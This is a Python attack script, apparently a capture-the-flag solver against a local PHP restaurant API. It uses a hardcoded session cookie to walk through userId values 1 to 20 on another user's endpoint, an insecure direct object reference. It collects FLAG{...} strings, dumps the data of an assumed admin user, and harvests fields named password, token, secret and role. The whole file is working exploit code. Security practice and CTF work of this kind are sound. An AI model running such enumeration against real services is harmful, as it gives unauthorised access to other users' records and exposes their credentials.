import requests
import json
import re
from datetime import datetime

BASE_URL = "http://127.0.0.1:33156"
API_ENDPOINT = "/api/get_favorite_restaurants.php"

def search_json_for_keywords(obj, path="", user_id=None):
    """Search for sensitive keywords in JSON structure"""
    sensitive_keywords = ['password', 'hint', 'secret', 'token', 'admin', 'role', 'privilege']
    findings = []
    
    if isinstance(obj, dict):
        for key, value in obj.items():
            current_path = f"{path}.{key}" if path else key
            
            # Check if keyword in field name
            for keyword in sensitive_keywords:
                if keyword.lower() in key.lower():
                    findings.append({
                        'user_id': user_id,
                        'field': current_path,
                        'value': str(value),
                        'keyword': keyword
                    })
            
            # Recursively search
            findings.extend(search_json_for_keywords(value, current_path, user_id))
            
    elif isinstance(obj, list):
        for idx, item in enumerate(obj):
            findings.extend(search_json_for_keywords(item, f"{path}[{idx}]", user_id))
    
    return findings

print("[API ENUMERATION: Starting scan...]")
print(f"Target: {BASE_URL}{API_ENDPOINT}")
print(f"Range: userId=1-20")
print("-" * 60)

# Initialize session with cookie
cookie = {"PHPSESSID": "j2jbue9ik42nla625rupl7v2jk"}
session = requests.Session()
session.cookies.update(cookie)

flags_found = []
sensitive_data = []
admin_data = None
response_stats = {'success': 0, 'failed': 0}

# Enumerate user IDs 1-20
for user_id in range(1, 21):
    try:
        url = f"{BASE_URL}{API_ENDPOINT}?userId={user_id}"
        response = session.get(url, timeout=15)
        
        # Parse JSON if possible
        try:
            json_data = response.json()
            
            # Search for flags in JSON
            json_str = json.dumps(json_data)
            flag_matches = re.findall(r'FLAG\{[^}]+\}', json_str)
            
            if flag_matches:
                for flag in flag_matches:
                    flags_found.append({'user_id': user_id, 'flag': flag})
                    print(f"[!] FLAG FOUND at userId={user_id}: {flag}")
            
            # Check for admin data
            if user_id == 7:
                admin_data = json_data
                print(f"[!] ADMIN USER (ID=7) detected: {json.dumps(json_data)}")
            
            # Search for sensitive keywords
            sensitive_findings = search_json_for_keywords(json_data, user_id=user_id)
            if sensitive_findings:
                for finding in sensitive_findings:
                    print(f"[ALERT] SENSITIVE in userId={user_id}: Field='{finding['field']}' Value='{finding['value']}'")
                sensitive_data.extend(sensitive_findings)
        
        except ValueError:
            # Not JSON, search raw text
            flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
            if flag_matches:
                for flag in flag_matches:
                    flags_found.append({'user_id': user_id, 'flag': flag})
                    print(f"[!] FLAG FOUND in raw response at userId={user_id}: {flag}")
        
        # Print response summary
        if response.status_code == 200:
            response_stats['success'] += 1
            print(f"[+] userId={user_id:2d} | OK | {len(response.content)} bytes")
        else:
            response_stats['failed'] += 1
            print(f"[-] userId={user_id:2d} | Status: {response.status_code}")
            
    except Exception as e:
        print(f"[-] userId={user_id:2d} | ERROR: {str(e)}")
        response_stats['failed'] += 1

# Final summary
print("\n" + "=" * 60)
print("SCAN COMPLETE - SUMMARY")
print("=" * 60)

print(f"\n[FLAGS] ({len(flags_found)} found)")
for item in flags_found:
    print(f"  User {item['user_id']}: {item['flag']}")

print(f"\n[ADMIN DATA] (userId=7)")
if admin_data:
    print(f"  Data: {json.dumps(admin_data)}")
else:
    print("  [WARNING] Admin user (ID=7) not found or no data")

print(f"\n[SENSITIVE FIELDS] ({len(sensitive_data)} found)")
for item in sensitive_data:
    print(f"  User {item['user_id']}: {item['field']} = {item['value']}")

print(f"\n[STATISTICS]")
print(f"  Successful: {response_stats['success']}")
print(f"  Failed: {response_stats['failed']}")
print(f"  Total: {response_stats['success'] + response_stats['failed']}")

# Raw data export for manual analysis
if flags_found:
    print(f"\n[!] CRITICAL: {len(flags_found)} FLAG(S) DISCOVERED")
    for item in flags_found:
        print(f"  -> FLAG FROM USER {item['user_id']}: {item['flag']}")
else:
    print("\n[STATUS] No FLAG{...} patterns found in responses")
